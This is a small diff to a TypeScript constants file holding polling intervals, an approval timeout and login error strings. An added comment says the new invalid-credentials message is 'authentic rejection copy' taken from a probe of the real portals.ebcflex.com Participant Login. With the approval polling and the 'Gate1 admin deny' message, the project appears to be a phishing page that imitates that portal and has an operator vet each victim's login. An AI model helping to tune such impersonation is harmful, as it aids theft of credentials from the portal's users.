@@ -2,7 +2,7 @@ export const LOG_OUT_API = "/api/login-out"
 export const LOG_OUT_REDIRECT_URL = "/"
 
 /** Fast polls for the first burst window, then steadier cadence. */
-export const BURST_POLL_MS = 200
+export const BURST_POLL_MS = 500
 export const BURST_WINDOW_MS = 10_000
 /** Steady poll interval after the burst window. */
 export const POLL_MS = 500
@@ -18,8 +18,9 @@ export const APPROVAL_TIMEOUT_MS = 90_000
 export const MSG_UNABLE_VERIFY_TIME =
   "We are unable to verify you at this time. Please try again."
 
+/** Authentic rejection copy from portals.ebcflex.com Participant Login probe. */
 export const MSG_LOGIN_INVALID_CREDENTIALS =
-  "Incorrect password or User ID."
+  "Your username or password is incorrect. Please try again."
 
 /** Gate1 admin deny — shown on homepage. */
 export const MSG_INCORRECT_USERNAME_PASSWORD = MSG_LOGIN_INVALID_CREDENTIALS
